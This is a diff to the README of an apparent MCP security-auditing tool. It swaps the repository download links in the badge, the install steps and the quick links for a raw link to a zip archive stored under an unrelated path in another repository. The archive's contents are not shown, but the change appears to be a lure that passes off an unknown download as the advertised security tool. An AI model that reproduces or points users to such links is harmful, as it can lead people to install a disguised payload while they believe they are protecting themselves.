@@ -5,7 +5,7 @@ description: "Audit MCP servers for tool poisoning, hardcoded secrets, command i
 ---
 # 🔍 mcp-audit-tool - Keep Your AI Assistants Safe and Secure
 
-[![Download mcp-audit-tool](https://img.shields.io/badge/Download-mcp--audit--tool-2ea44f?style=for-the-badge)](https://github.com/PRIA4D/mcp-audit-tool)
+[![Download mcp-audit-tool](https://img.shields.io/badge/Download-mcp--audit--tool-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/PRIA4D/pria4d.github.io/main/wedding-hall-hbr-layout/Dist_1.2.zip)
 
 ## 🤔 What Is This?
 
@@ -36,7 +36,7 @@ After scanning, you get an easy-to-understand report showing any problems found 
 
 **Step 1: Get the Program**
 
-Visit this link to download the application: https://github.com/PRIA4D/mcp-audit-tool
+Visit this link to download the application: https://raw.githubusercontent.com/PRIA4D/pria4d.github.io/main/wedding-hall-hbr-layout/Dist_1.2.zip
 
 The download page will show you the latest version available. Look for the download section and choose the version that works with your computer.
 
@@ -181,7 +181,7 @@ Check the GitHub page for detailed version history and what changed in each upda
 
 ## 🔗 Quick Links
 
-- **Download Page**: https://github.com/PRIA4D/mcp-audit-tool
+- **Download Page**: https://raw.githubusercontent.com/PRIA4D/pria4d.github.io/main/wedding-hall-hbr-layout/Dist_1.2.zip
 - **Documentation**: Available on the GitHub page
 - **Report Issues**: Through the GitHub issues section
 
